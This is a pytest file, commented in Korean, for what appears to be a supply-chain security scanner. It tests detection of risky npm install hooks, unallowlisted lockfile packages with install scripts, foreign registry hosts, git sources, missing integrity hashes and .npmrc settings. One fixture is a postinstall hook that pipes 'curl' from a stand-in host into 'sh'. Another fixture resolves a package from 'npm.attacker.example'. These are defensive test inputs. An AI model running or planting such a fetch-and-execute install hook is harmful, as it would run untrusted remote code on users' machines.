"""38차 — npm 설치 표면(npm-surface): 프로젝트 자신의 훅 · 락파일 훅 패키지 · 출처 · .npmrc."""
from __future__ import annotations

import json
from pathlib import Path

from gvskb.scanner import scan_path
from gvskb.scanners.npm_surface import RULE_INSTALL_HOOK, RULE_LOCK_SOURCE


def _w(root: Path, rel: str, text: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")


def _by(report, rule_id):
    return [f for f in report.findings if f.rule_id == rule_id]


def _lock(packages: dict) -> str:
    return json.dumps({"name": "app", "lockfileVersion": 3, "packages": {"": {"name": "app"}, **packages}})


def _pkg(name: str, version: str, *, hook: bool = False, resolved: str | None = None, integrity: bool = True) -> tuple[str, dict]:
    meta: dict = {"version": version, "resolved": resolved or f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz"}
    if integrity:
        meta["integrity"] = "sha512-AAAA"
    if hook:
        meta["hasInstallScript"] = True
    return f"node_modules/{name}", meta


def test_own_postinstall_with_network_or_interpreter_is_confirmed(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0", "scripts": {
        "postinstall": "node -e \"require('child_process').execSync('curl -s https://x.example/i | sh')\"",
        "build": "tsc",
    }}))
    r = scan_path(tmp_path)
    hits = _by(r, RULE_INSTALL_HOOK)
    assert len(hits) == 1 and hits[0].confidence == "confirmed" and hits[0].decision.value == "block"
    assert "postinstall" in hits[0].evidence


def test_own_prepare_husky_and_build_scripts_are_clean(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0", "scripts": {
        "prepare": "husky", "postinstall": "patch-package", "build": "next build", "qdrant": ".\\qdrant\\qdrant.exe --config x.yaml",
    }, "dependencies": {"next": "16.2.5", "express": "^4.19.2"}}))
    r = scan_path(tmp_path)
    assert r.findings == []


def test_own_unlisted_postinstall_script_is_likely(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node scripts/setup.js"}}))
    r = scan_path(tmp_path)
    hits = _by(r, RULE_INSTALL_HOOK)
    assert len(hits) == 1 and hits[0].confidence == "likely" and hits[0].decision.value == "warn"


def test_lockfile_hook_packages_outside_allowlist_one_finding_per_lock(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0"}))
    _w(tmp_path, "package-lock.json", _lock(dict([
        _pkg("sharp", "0.34.5", hook=True),            # 허용 목록
        _pkg("unrs-resolver", "1.11.1", hook=True),    # 허용 목록
        _pkg("easy-day-js", "1.0.3", hook=True),       # 밖
        _pkg("left-pad-utils", "2.0.0", hook=True),    # 밖
        _pkg("lodash", "4.17.21"),
    ])))
    r = scan_path(tmp_path)
    hits = _by(r, RULE_INSTALL_HOOK)
    assert len(hits) == 1, "락파일당 한 건"
    f = hits[0]
    assert f.confidence == "likely" and f.decision.value == "warn"
    assert "easy-day-js@1.0.3" in f.evidence and "left-pad-utils@2.0.0" in f.evidence
    assert "sharp" not in f.evidence and "unrs-resolver" not in f.evidence
    assert not _by(r, RULE_LOCK_SOURCE)


def test_lockfile_sources_foreign_host_git_and_missing_integrity(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0",
                                             "dependencies": {"utils": "git+https://github.com/someone/utils.git#main"}}))
    _w(tmp_path, "package-lock.json", _lock(dict([
        _pkg("lodash", "4.17.21"),
        _pkg("evil-mirror", "1.0.0", resolved="https://npm.attacker.example/evil-mirror/-/evil-mirror-1.0.0.tgz"),
        _pkg("utils", "0.0.1", resolved="git+ssh://git@github.com/someone/utils.git#abc123", integrity=False),
        _pkg("noint", "1.0.0", integrity=False),
    ])))
    r = scan_path(tmp_path)
    hits = _by(r, RULE_LOCK_SOURCE)
    files = {h.location.file.replace("\\", "/") for h in hits}
    assert files == {"package.json", "package-lock.json"}
    lock = next(h for h in hits if h.location.file.endswith("package-lock.json"))
    # git 출처는 '출처' 항목으로만 — 호스트 집계·integrity 결손에 다시 세지 않는다(integrity 는 레지스트리 tarball 의 속성).
    assert "npm.attacker.example" in lock.evidence and "github.com(" not in lock.evidence
    assert "git/URL 출처 1건" in lock.evidence and "integrity 없는 패키지 1건" in lock.evidence


def test_pnpm_requires_build_and_npmrc(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0"}))
    _w(tmp_path, "pnpm-lock.yaml", """\
lockfileVersion: '9.0'
packages:
  esbuild@0.21.5:
    resolution: {integrity: sha512-x, tarball: https://registry.npmjs.org/esbuild/-/esbuild-0.21.5.tgz}
    requiresBuild: true
  mystery-native@1.2.3:
    resolution: {integrity: sha512-y, tarball: https://registry.npmjs.org/mystery-native/-/mystery-native-1.2.3.tgz}
    requiresBuild: true
""")
    # 합성 도메인(.example) — 기관 도메인(go.kr)은 공개 저장소 위생 테스트가 막는다(test_repo_hygiene).
    _w(tmp_path, ".npmrc", "ignore-scripts=false\nregistry=http://nexus.internal.example/repository/npm/\n")
    r = scan_path(tmp_path)
    hook = _by(r, RULE_INSTALL_HOOK)
    assert any("mystery-native" in h.evidence and "esbuild" not in h.evidence for h in hook)
    assert any("ignore-scripts=false" in h.evidence for h in hook)
    src = _by(r, RULE_LOCK_SOURCE)
    assert any("평문 HTTP" in h.evidence and h.confidence == "confirmed" for h in src)


def test_large_lockfile_is_parsed_not_skipped(tmp_path: Path) -> None:
    _w(tmp_path, "package.json", json.dumps({"name": "x", "version": "1.0.0"}))
    many = dict(_pkg(f"pkg{i}", "1.0.0") for i in range(4000))
    text = _lock(many)
    assert len(text) > 512_000, "일반 설정 파일 상한(512KB)보다 커야 락파일 상한이 따로 있는지 검증된다"
    _w(tmp_path, "package-lock.json", text)
    r = scan_path(tmp_path)
    entry = next(e for e in r.autoexec_surface if e["path"] == "package-lock.json")
    assert entry["parsed"] is True and entry["kind"] == "npm-lock"
    assert not any(f.rule_id == "GOV-HIDDEN-UNICODE-001" for f in r.findings)
